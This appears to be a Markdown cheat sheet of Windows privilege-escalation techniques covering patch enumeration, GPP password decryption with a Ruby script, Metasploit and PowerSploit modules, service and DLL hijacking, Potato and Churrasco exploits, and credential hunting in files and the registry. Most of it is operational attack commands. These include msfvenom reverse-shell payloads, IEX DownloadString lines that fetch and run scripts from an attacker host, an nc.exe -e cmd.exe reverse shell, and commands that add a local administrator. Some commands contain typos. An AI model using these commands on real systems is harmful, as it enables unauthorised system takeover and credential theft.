#### Information Gathering
- systeminfo ***OS info***
- hostname ***host info***
- net users ***users info***
- net user <user_name>
- ipconfig /all ***network interfaces and routing table.***
- route print
- arp -A
- netstat -ano ***network connections and the firewall rules***
- netsh firewall show state
- netsh firewall show state
- netsh firewall show config
- schtasks /query /fo LIST /v ***scheduled tasks, running processes, started services and installed drivers.***
- tasklist /SVC
- net start

#### Service available form inside
- netstat -ano
----------------------------------------------------------------------------------------------------------------------------------
#### Kernel Exploit ***
- Missing Patches
```
The HotFixID can be used in correlation with the table below in order to discover any missing patches related to privilege escalation. As the focus is on privilege escalation the command can be modified slightly to discover patches based on the KB number.
- wmic qfe get Caption,Description,HotFixID,InstalledOn
```
- PowerShell identify patches that can lead to privilege escalation
```
This script is called Sherlock and it will check a system for the following:
```
|Operating System	 |Description |Security Bulletin |KB|
|------------------|:----------:|:----------------:|----:|
|Windows Server 2008, Vista, 7|	WebDAV|	MS16-016|	3136041|	
|Windows Server 2003, Windows Server 2008, Windows 7, Windows 8, Windows 2012v|	Windows Kernel Mode Drivers|	MS15-051|	3057191|	
|Windows Server 2003, Windows Server 2008, Windows Server 2012, 7, 8|	Win32k.sys|	MS14-058|	3000061|	
|Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012|	AFD Driver|	MS14-040|	2975684	|
|Windows XP, Windows Server 2003|	Windows Kernel|	MS14-002|	2914368	|
|Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012|	Kernel Mode Driver|	MS13-005|	2778930	|
|Windows Server 2008, 7|	Task Scheduler|	MS10-092|	2305420	|
|Windows Server 2003, Windows Server 2008, 7, XP|	 KiTrap0D|	MS10-015|	977165	
|Windows Server 2003, XP|	NDProxy	MS14-002|	2914368|	Exploit
|Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012|	Kernel Driver|	MS15-061|	3057839|
|Windows Server 2003, XP|	AFD.sys|	MS11-080|	2592799	|
|Windows Server 2003, XP|	NDISTAPI|	MS11-062|	2566454	|
|Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012|	RPC|	MS15-076|	3067505	|
|Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012|	Hot Potato|	MS16-075|	3164038	|
|Windows Server 2003, Windows Server 2008, 7, XP|	Kernel Driver|	MS15-010|	3036220|	
|Windows Server 2003, Windows Server 2008, 7, XP|	AFD.sys|	MS11-046|	2503665|
----------------------------------------------------------------------------------------------------------------------------------
#### Group Policy Preferences
- Group policy preferences allows domain admins to create and deploy across the domain local users and local administrators accounts.

***Metasploit***
- post/windows/gather/credentials/gpp
```
Since domain administrators can set up local administrators accounts through the Group Policy this can lead to privilege escalation. These credentials can be used with the PsExec Metasploit module in order to successfully login to the workstation as SYSTEM.
```
  - > use exploit/windows/smb/psexec
  - > set rhost, rport
  - > set SHARE ADMIN$
  - > set SMBDomain domain_name
  - > set SMBUser user_name
  - > set SMBPass password

***Powersploit***
- > Get-CachedGPPPassword //For locally stored GP Files
- > Get-GPPPassword //For GP Files stored in the DC

***Manual Exploitation***
```
In order to exploit this issue manually it is needed to manually browse to the Groups.xml file which is stored in a shared directory in the domain controller and obtain the value of the attribute cpassword.
```
we can decrypt cpassword via use script gp3finder.exe
or  Chris Gates ruby script
```
require 'rubygems'
require 'openssl'
require 'base64'
 
encrypted_data = "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
 
def decrypt(encrypted_data)
padding = "=" * (4 - (encrypted_data.length % 4))
epassword = "#{encrypted_data}#{padding}"
decoded = Base64.decode64(epassword)
 
key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\
x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\
x33\xb6\x6c\x1b"
aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
aes.decrypt
aes.key = key
plaintext = aes.update(decoded)
plaintext << aes.final
pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion 
 
return pass
end 
 
blah = decrypt(encrypted_data)
puts blah
```

***PowerShell via Metasploit***
- > exploit(handler) > use exploit/windows/local/payload/payload_inject
- > set session 1
- > set payload windows/powershell_reverse_tcp
- > set LHOST ip
- > set LPORT port
- > exploit

from the interactive PowerShell session the Invoke-Expression
IEX(New-Object Net.WebClient).DownloadString("http://lhost/tmp/PowerUp.ps1")
IEX(New-Object Net.WebClient).DownloadString("http://lhost/tmp/PowerView.ps1")

----------------------------------------------------------------------------------------------------------------------------------
#### DLL Hijacking
```
 If these DLL’s doesn’t exist or are implemented in an insecure way (DLL’s are called without using a fully qualified path) then it is possible to escalate privileges by forcing the application to load and execute a malicious DLL file
when an application needs to load a DLL it will go through the following order:
-The directory from which the application is loaded
-C:\Windows\System32
-C:\Windows\System
-C:\Windows
-The current working directory
-Directories in the system PATH environment variable
-Directories in the user PATH environment variable
```
***PowerSploit***
> Find-ProcessDLLHijack :identify all the processes on the system that are trying to load DLL’s which are missing
> Find-PathDLLHijack :identification of paths that the user can modify the content
> Write-HijackDll :generate the hijackable DLL into one of the folders that have been identified above with Modify
  - DLLPath: get path from ModifiablePath
  
***Manual***
- Processes with Missing DLL’s
 list all the processes on the system and discover these processes which are running as SYSTEM and are missing DLL’s.This can be done just by using the process monitor tool from Sysinternals. Process Monitor will identify if there is any DLL that the application tries to load and the actual path that the application is looking for the missing DLL
- Folder Permissions
By default if a software is installed on the C:\ directory instead of the C:\Program Files then authenticated users will have write access on that directory. Additionally software like Perl, Python, Ruby etc. usually are added to Path variable. This give the opportunity of privilege escalation since the user can write a malicious DLL in that directory which is going to be loaded the next time that the process will restart with the permission of that process.
- DLL Hijacking
Metasploit can be used in order to generate a DLL that will contain a payload which will return a session with the privileges of the service.
  - msfvenom -p windows/x64meterpreter/reverse_tcp LHOST=ip LPORT=port 0f dll > file.dll
As it has been identified above the process is missing the Riched32.dll so the file.dll needs to be renamed as Riched32.dll. This will confuse the application and it will try to load it as the application will think that this is a legitimate DLL. This malicious DLL needs to be dropped in one of the folders that windows are loading DLL files.

The process xyz.exe it is running as SYSTEM which means these privileges will be granted to the user upon restart of the service since the DLL with the malicious payload will be loaded and executed by the process.

----------------------------------------------------------------------------------------------------------------------------------
#### Weak Services
***Metasploit***
- > getuid
- > backgroud
- (handler) > use exploit/windows/local/service_permissions
- (service_permission) > set session 1
- (service_permission) > set LHOST local_ip
- (service_permission) > exploit

***PowerSploit***
- Privileges available there are two scenarios for privilege escalation:
  - Binary Path
  - Replacing the Service Binary
  
- Binary Path
  - Get-ServiceDetail module will list some basic information about the service like the process ID and the state.
  - > Get-ServiceDetail
  - > Get-ServiceDetail | more
  - > Invoke-ServiceAbuse : Module Invoke-ServiceAbuse will automatically modify the binary path and restart the service in order to add the user xyz into the local administrators group.
    - set name[0]: Apache
  - > net localgroup Administrators
 
- Replacing the Service Binary 
  - > Get-ServiceDetail
    - Apache Service is running as Local System
    - Standard users have permissions to modify the file of where the binary is stored
  - this means that the httpd.exe can be replaced by normal users. PowerSploit can also create a custom binary that will add a user as local administrator
  - Write-ServiceBinary
    - Name: Apache
    - output.exe
```
It should be noted that the service.exe needs to be renamed to httpd.exe ,which is the original binary that the service will execute, and dropped into the binary path.
Once the service is restarted the command will be executed and a new user will be created on the system with local administrator rights
```
- net localgroup administrators

#### Alternative with metasploit
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=[your_ip] LPORt=[your_port] -f exe -o /root/Desktop/httpd.exe
- msf expoloit(handler)> exploit

***Manual***
meterpreter > upload -f /root/Desktop/accesschk.exe C:\\Users\folder
meterpreter > shell
C:\Users\folder>accesschk.exe -uwcqv "username" * -accepteula : list all the services that the user “pentestlab” can modify.

v - Verbose (includes Windows Vista Integrity Level)
u - Suppress errors
q - Omit Banner
s - Recurse
w - Show only objects that have write access
```
Result
RW Apache
  SERVICE_ALL_ACCESS
Service All Access means that the user has full control over this service and therefore it is possible the properties of this service to be modified. The next step is to determine the status of this service, the binary path name and if the service with higher privileges
```
C:\Users\folder> sc qc Apache
```
Since the Apache service is running as Local System this means that the BINARY_PATH_NAME parameter can be modified to execute any command on the system.
```
C:\Users\folder>sc config "Apache" binPath= "net localgroup administrators [username] /add
C:\Users\folder>sc stop "Apache"
C:\Users\folder>sc stop "Apache"

net localgroup administrators
---------------------------------------------------------------------------------------------------------------------------------
#### Hot Potato
Technique is actually a combination of two known windows issues  like NBNS spoofing and NTLM relay with the implementation of a fake WPAD proxy server which is running locally on the target host.

NTLM authentication via the same protocol like SMB has been already patched by Microsoft however this technique is using HTTP to SMB authentication in order to create a high privilege service as the HTTP request might come from a high privilege service like the Windows update. Since the traffic contains the NTLM credentials and is passing through a fake proxy server it can be captured and passed to a local SMB listener to create an elevated service which can execute any command  as SYSTEM.
https://foxglovesecurity.com/2016/01/16/hot-potato/

***Authenticated User***
- https://github.com/foxglovesec/Potato
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
Potato.exe -ip [IP] -cmd "C:\\Windows\\System32\\cmd.exe -K net localgroup administrator [username] /ADD" -disable_exhaust true -disable _defender true

***PowerShell***
- https://github.com/Kevin-Robertson/Tater

----------------------------------------------------------------------------------------------------------------------------------
#### Stored Credentials
***Find passwords in Windows File***
- findstr /si password *.txt
- findstr /si password *.xml
- findstr /si password *.ini
- findstr /spin "password" *.*
- C:\> dir /s *pass* == *cred* == *vnc* == *.config*
- C:\> dir /b /s unattend.xml
- C:\> dir /b /s web.config
- C:\> dir /b /s sysprep.inf
- C:\> dir /b /s sysprep.xml
- C:\> dir /b /s *pass*
- C:\> dir /b /s vnc.ini

***password stored in windows files***
- C:\sysprep.inf
- C:\sysprep\sysprep.xml
- C:\unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
- C:\inetpub\wwwroot\web.config
- dir c:\*vnc.ini /s /b
- dir c:\*ultravnc.ini /s /b 
- dir c:\ /s /b | findstr /si *vnc.ini
- *Group Policy Preferences* The Groups.xml file contains the password is cached locally.
```
C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml
\\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml
```
- Other policy preference files
```
Services\Services.xml
ScheduledTasks\ScheduledTasks.xml
Printers\Printers.xml
Drives\Drives.xml
DataSources\DataSources.xml
```
***In Registry***
- ***Putty*** : reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
- ***SNMP Paramters*** : reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
- ***Windows autologin*** : reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
- ***VNC*** : reg query "HKCU\Software\ORL\WinVNC3\Password"
- ***Search for password in registry*** : reg query HKLM /f password /t REG_SZ /s ***OR*** reg query HKCU /f password /t REG_SZ /s
- reg query HKLM /f password /t REG_SZ /s
- reg query HKCU /f password /t REG_SZ /s
- ***McAfee*** : %AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml

***PowerSploit***
```
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
```
----------------------------------------------------------------------------------------------------------------------------------
### DLL injection
##### Technique which allows an attacker to run arbitrary code in the context of the address space of another process.
- This technique follows the steps below:
  - A DLL needs to be dropped into the disk
  - The “CreateRemoteThread” calls the “LoadLibrary”
  - The reflective loader function will try to find the Process Environment Block (PEB) of the target process using the appropriate CPU     register and from that will try to find the address in memory of kernel32dll and any other required libraries.
  - Discovery of the memory addresses of required API functions such as LoadLibraryA, GetProcAddress, and VirtualAlloc.
  - The functions above will be used to properly load the DLL into memory and call its entry point DllMain which will execute the DLL.
  
***Metasploit***
- > use post/windows/manage/reflective_dll_inject
  - > set session x
  - > set PID y
  - > set PATH C\\Users\\Administrator\\Desktop\\pentestlab.dll
  - > run

***PowerSploit***
```
Msfvenom can be used to generate the malicious DLL and then through the task manager the PID of the target process can be obtained. If the process is running as SYSTEM then the injected DLL will run with the same privileges as well and the elevation will be achieved
```
- msfvenom -p windows/shell/reverse_tcp LHOST=[YourIP] LPORT=[YourPort] -f dll > my_dll_from_msfvenom.dll
- msfvenom -f dll -p windows/exec CMD="C:\windows\system32\calc.exe" -o my_dll_from_msfvenom.dll

***Invoke-DLLInjection -ProcessID [xyz_process_id] -DLL C:\Users\Administrator\my_dll_from_msfvenom.dll***

----------------------------------------------------------------------------------------------------------------------------------
#### With meterpreter
- use post/windows/gather/enum_patches
  - set SESSION 1
  - set KB "KB3143142", "KB31432342"
  - run
- use post/multi/recon/local_exploit_suggester
  - set session ?
  - run

- example: use exploit/windows/local/ms10_015_kitrap0d
  - options
  - run
 
 ***Manual Method****
 - msfvenom -p windows/shell/reverse_tcp LHOST=[YourIP] LPORT=[YourPort] -f dll > my_dll_from_msfvenom.dll
 
metaspolit
- use exploit/muti/handler
  - set payload windows/x64/meterpreter/reverse_tcp
  - set lhost [your_ip]
  - set lport [your_port]
  - exploit
 
Remote DLL Injector https://securityxploded.com/remote-dll-injector.php
Using the CreateRemoteThread technique and it has the ability to inject DLL into ASLR enabled processes.
```
RemoteDLLInjector64.exe process_PID C:\remote-dll-injector.php
```
check meterpreter

----------------------------------------------------------------------------------------------------------------------------------
#### Windows Exploit Suggester 
compares the patch level of a system against the Microsoft vulnerability database and can be used to identify those exploits that could lead to privilege escalation. The only requirement is that requires the system information from the target.

----------------------------------------------------------------------------------------------------------------------------------
#### Churrasco Use Local Privilages Escalation via Token Kidnapping
- churrasco.bin "net user user_login user_password /add && net localgroup Administrators user_login /add"

###### Add user to Remote Desktop Users
- churrasco "NET LOCALGROUP "Remote Desktop Users" user_login /ADD"

###### Reverse shell via Admin and currasco  (need nc.exe)
churrasco.exe “nc.exe ip port -e cmd.exe”
- ***Churrasco*** https://www.exploit-db.com/exploits/6705
----------------------------------------------------------------------------------------------------------------------------------
#### Usefull scrips

- ***Windows Exploit Suggester*** https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- ***JustAnotherWindowsScript(Enum)*** https://github.com/411Hall/JAWS
- ***Impacket*** https://github.com/SecureAuthCorp/impacket
- ***Nishang*** https://github.com/samratashok/nishang
- ***PowerSploit*** https://github.com/PowerShellMafia/PowerSploit
- ***Sherlock*** https://github.com/rasta-mouse/Sherlock
- ***Watson** https://github.com/rasta-mouse/Watson
